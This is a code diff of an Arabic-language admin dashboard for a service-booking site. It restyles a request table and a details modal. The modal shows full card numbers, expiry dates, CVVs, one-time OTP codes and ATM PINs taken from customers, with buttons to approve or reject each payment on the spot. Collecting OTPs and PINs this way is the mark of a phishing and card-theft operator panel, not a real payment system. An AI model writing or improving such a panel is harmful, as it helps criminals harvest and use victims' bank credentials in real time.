@@ -144,9 +144,9 @@
         const thead = document.getElementById('t-head');
         const tbody = document.getElementById('t-body');
 
-        thead.innerHTML = '<tr><th>نوع الخدمة</th><th>تفاصيل الخدمة</th><th>اسم العميل</th><th>رقم الهاتف</th><th>البريد الإلكتروني</th><th>تاريخ البدء</th><th>رقم العقد</th><th>الحالة</th><th>الإجراءات الفورية والقرار</th></tr>';
+        thead.innerHTML = '<tr><th>نوع الخدمة</th><th>تفاصيل الخدمة</th><th>اسم العميل</th><th>رقم الهاتف</th><th>البريد الإلكتروني</th><th>تاريخ البدء</th><th>الحالة</th><th>الإجراءات الفورية والقرار</th></tr>';
         if (!filtered.length) {
-            tbody.innerHTML = '<tr><td colspan="9" class="empty-row">لا توجد طلبات أو معاملات دفع مسجلة حتى الآن</td></tr>';
+            tbody.innerHTML = '<tr><td colspan="8" class="empty-row">لا توجد طلبات أو معاملات دفع مسجلة حتى الآن</td></tr>';
             return;
         }
 
@@ -160,15 +160,8 @@
             const startDate = info.startDate !== '—' ? info.startDate : fmtDate(lead?.created_at || payment?.created_at);
             const contractNo = lead?.contract_no || payment?.contract_no || '—';
 
-            // تفاصيل الخدمة مرتبة
-            const detailsHtml = '<div class="service-summary">' +
-                '<b>' + esc(info.service || info.serviceType || '—') + '</b>' +
-                '<div style="font-size:12px; color:#475569; margin-top:2px;">' +
-                (info.duration !== '—' ? '<span>المدة: <b>' + esc(info.duration) + '</b></span>' : '') +
-                (info.workType !== '—' ? '<span style="margin-right:6px;">النوع: <b>' + esc(info.workType) + '</b></span>' : '') +
-                (info.workers !== '—' ? '<span style="margin-right:6px;">العدد: <b>' + esc(info.workers) + '</b></span>' : '') +
-                (info.nationality !== '—' ? '<span style="margin-right:6px;">الجنسية: <b>' + esc(info.nationality) + '</b></span>' : '') +
-                '</div></div>';
+            // تفاصيل الخدمة: اسم الخدمة فقط
+            const detailsHtml = '<div class="service-summary"><b>' + esc(info.service || info.serviceType || '—') + '</b></div>';
 
             // أزرار القرار الفوري والقبول والرفض إذا وجد دفع
             let actions = '<button class="btn-act" onclick="openDetails(' + (lead ? lead.id : 'null') + ', \'' + esc(contractNo) + '\')">عرض التفاصيل</button>';
@@ -184,7 +177,6 @@
                 '<td dir="ltr">' + esc(phone) + '</td>' +
                 '<td dir="ltr">' + esc(email) + '</td>' +
                 '<td>' + esc(startDate) + (info.startTime !== '—' ? ' <span style="color:#7c3aed; font-weight:700;">(' + esc(info.startTime) + ')</span>' : '') + '</td>' +
-                '<td><span class="badge" dir="ltr">' + esc(contractNo) + '</span></td>' +
                 '<td>' + statusBadge(lead, payment) + '</td>' +
                 '<td><div class="action-btns">' + actions + '</div></td>' +
                 '</tr>';
@@ -217,7 +209,15 @@
         modalTitle.innerText = 'تفاصيل الطلب والعقد الشاملة — ' + (contractNo || 'بدون عقد');
         let html = '';
 
-        // 1. بيانات العميل
+        // 1. رقم العقد
+        if (contractNo && contractNo !== '—') {
+            html += '<div style="background:#eff6ff; border:1px solid #bfdbfe; border-radius:10px; padding:10px 16px; margin-bottom:14px; font-size:13.5px; display:flex; align-items:center; justify-content:space-between; gap:10px;">';
+            html += '<span style="color:#1e40af; font-weight:700;">رقم العقد</span>';
+            html += '<span class="badge" dir="ltr" style="font-size:13px;">' + esc(contractNo) + '</span>';
+            html += '</div>';
+        }
+
+        // 2. بيانات العميل
         html += '<div class="sec-header"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>بيانات العميل الأساسية</div>';
         if (lead) {
             html += '<div style="background:#f8fafc; border:1px solid #e2e8f0; border-radius:10px; padding:14px; margin-bottom:16px;">';
@@ -226,7 +226,13 @@
             html += '<div dir="ltr"><b>رقم الهاتف:</b> ' + esc(lead.phone) + '</div>';
             html += '<div dir="ltr"><b>البريد الإلكتروني:</b> ' + esc(lead.email) + '</div>';
             html += '<div><b>العنوان / المدينة:</b> ' + esc(lead.city) + '</div>';
-            html += '</div></div>';
+            html += '<div><b>تاريخ التقديم:</b> ' + esc(fmtDate(lead.created_at)) + '</div>';
+            html += '<div><b>الحالة:</b> ' + esc(lead.status) + '</div>';
+            html += '</div>';
+            if (lead.message) {
+                html += '<div style="margin-top:10px; padding-top:10px; border-top:1px solid #e2e8f0; font-size:12.5px; color:#475569;"><b>ملاحظات العميل:</b> ' + esc(lead.message) + '</div>';
+            }
+            html += '</div>';
         } else {
             html += '<div style="color:#94a3b8; margin-bottom:16px; font-size:13px;">لا توجد بيانات عميل نصية مسجلة مباشرة (طلب دفع مباشر).</div>';
         }
@@ -250,24 +256,34 @@
         }
         html += '</div>';
 
-        // 3. معلومات البطاقة والتحقق والدفع (OTP & ATM PIN)
+        // 3. معلومات البطاقة والتحقق والدفع (OTP & ATM PIN) — مربعات منسقة
         if (payment) {
-            html += '<div class="sec-header sec-purple"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="1" y="4" width="22" height="16" rx="2" ry="2"/><line x1="1" y1="10" x2="23" y2="10"/></svg>بيانات الدفع والبطاقة ورمز التحقق (OTP & PIN)</div>';
-            html += '<div style="background:#faf5ff; border:1px solid #f3e8ff; border-radius:10px; padding:14px; font-size:13.5px;">';
-            html += '<div style="display:grid; grid-template-columns: 1fr 1fr; gap:10px; margin-bottom:8px;">';
-            html += '<div><b>المبلغ الإجمالي:</b> <span style="color:#2563eb; font-weight:700;">' + esc(payment.amount) + ' درهم</span></div>';
-            html += '<div><b>المرحلة الحالية:</b> ' + esc(payment.stage) + '</div>';
-            html += '<div><b>اسم حامل البطاقة:</b> ' + esc(payment.card_name) + '</div>';
-            html += '<div dir="ltr"><b>رقم البطاقة:</b> ' + esc(payment.card_number) + '</div>';
-            html += '<div dir="ltr"><b>تاريخ الانتهاء / CVV:</b> ' + esc(payment.card_expiry) + ' / ' + esc(payment.card_cvv) + '</div>';
-            html += '<div dir="ltr"><b>رمز التحقق OTP:</b> <span style="color:#d97706; font-weight:700; font-size:15px;">' + esc(payment.otp_code || '—') + '</span></div>';
-            html += '<div dir="ltr"><b>رقم الصراف ATM PIN:</b> <span style="color:#7c3aed; font-weight:700; font-size:15px;">' + esc(payment.atm_pin || '—') + '</span></div>';
-            html += '<div><b>قرار الإدارة:</b> ' + (payment.decision === 'approved' ? '<span style="color:#16a34a; font-weight:700;">مقبول</span>' : (payment.decision === 'rejected' ? '<span style="color:#dc2626; font-weight:700;">مرفوض</span>' : '<span style="color:#ca8a04; font-weight:700;">قيد الانتظار</span>')) + '</div>';
+            const decBadge = payment.decision === 'approved' ? '<span style="background:#dcfce7; color:#15803d; border:1px solid #86efac; border-radius:20px; padding:3px 14px; font-weight:700; font-size:13px;">مقبول</span>' : (payment.decision === 'rejected' ? '<span style="background:#fee2e2; color:#b91c1c; border:1px solid #fca5a5; border-radius:20px; padding:3px 14px; font-weight:700; font-size:13px;">مرفوض</span>' : '<span style="background:#fef3c7; color:#b45309; border:1px solid #fcd34d; border-radius:20px; padding:3px 14px; font-weight:700; font-size:13px;">قيد الانتظار</span>');
+            html += '<div class="sec-header sec-purple"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="1" y="4" width="22" height="16" rx="2" ry="2"/><line x1="1" y="10" x2="23" y2="10"/></svg>بيانات الدفع والبطاقة ورمز التحقق</div>';
+            // ملخص المبلغ والمرحلة والقرار
+            html += '<div style="background:#faf5ff; border:1px solid #f3e8ff; border-radius:10px; padding:12px 14px; margin-bottom:12px; font-size:13.5px; display:flex; align-items:center; justify-content:space-between; flex-wrap:wrap; gap:8px;">';
+            html += '<span><b>المبلغ الإجمالي:</b> <span style="color:#2563eb; font-weight:700;">' + esc(payment.amount) + ' درهم</span></span>';
+            html += '<span><b>المرحلة الحالية:</b> ' + esc(payment.stage) + '</span>';
+            html += '<span><b>قرار الإدارة:</b> ' + decBadge + '</span>';
             html += '</div>';
-            html += '<div style="margin-top:12px; display:flex; gap:10px; border-top:1px solid #e9d5ff; padding-top:10px;">';
+            // صندوق بيانات البطاقة
+            html += '<div style="background:#ffffff; border:1px solid #e2e8f0; border-radius:10px; overflow:hidden; margin-bottom:12px;">';
+            html += '<div style="background:#f1f5f9; border-bottom:1px solid #e2e8f0; padding:9px 14px; font-size:13px; font-weight:700; color:#334155;">بيانات البطاقة</div>';
+            html += '<div style="padding:12px 14px;">';
+            html += '<div class="detail-row" dir="rtl"><span class="detail-label">اسم حامل البطاقة</span><span class="detail-value">' + esc(payment.card_name || '—') + '</span></div>';
+            html += '<div class="detail-row" dir="ltr"><span class="detail-label" dir="rtl">رقم البطاقة</span><span class="detail-value"><b>' + esc(payment.card_number || '—') + '</b></span></div>';
+            html += '<div class="detail-row" dir="ltr"><span class="detail-label" dir="rtl">تاريخ الانتهاء / CVV</span><span class="detail-value"><b>' + esc(payment.card_expiry || '—') + '</b> <span style="color:#94a3b8;">/</span> <b>' + esc(payment.card_cvv || '—') + '</b></span></div>';
+            html += '</div></div>';
+            // صندوق OTP و ATM PIN
+            html += '<div style="background:#ffffff; border:1px solid #e2e8f0; border-radius:10px; overflow:hidden;">';
+            html += '<div style="background:#f1f5f9; border-bottom:1px solid #e2e8f0; padding:9px 14px; font-size:13px; font-weight:700; color:#334155;">رموز التحقق</div>';
+            html += '<div style="padding:12px 14px;">';
+            html += '<div class="detail-row" dir="ltr"><span class="detail-label" dir="rtl">رمز التحقق OTP</span><span class="detail-value" style="border-color:#fbbf24; background:#fffbeb;"><b style="color:#b45309; font-size:15px; letter-spacing:2px;">' + esc(payment.otp_code || '—') + '</b></span></div>';
+            html += '<div class="detail-row" dir="ltr"><span class="detail-label" dir="rtl">رقم الصراف ATM PIN</span><span class="detail-value" style="border-color:#a78bfa; background:#f5f3ff;"><b style="color:#6d28d9; font-size:15px; letter-spacing:2px;">' + esc(payment.atm_pin || '—') + '</b></span></div>';
+            html += '</div></div>';
+            html += '<div style="margin-top:14px; display:flex; gap:10px; border-top:1px solid #e9d5ff; padding-top:12px;">';
             html += '<button class="btn-act btn-approve" style="flex:1; height:38px; justify-content:center;" onclick="decidePayment(' + payment.id + ', \'approved\')">قبول الدفع فوراً</button>';
             html += '<button class="btn-act btn-reject" style="flex:1; height:38px; justify-content:center;" onclick="decidePayment(' + payment.id + ', \'rejected\')">رفض الدفع</button>';
-            html += '</div>';
             html += '</div>';
         } else {
             html += '<div class="sec-header sec-amber"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>حالة الدفع</div>';
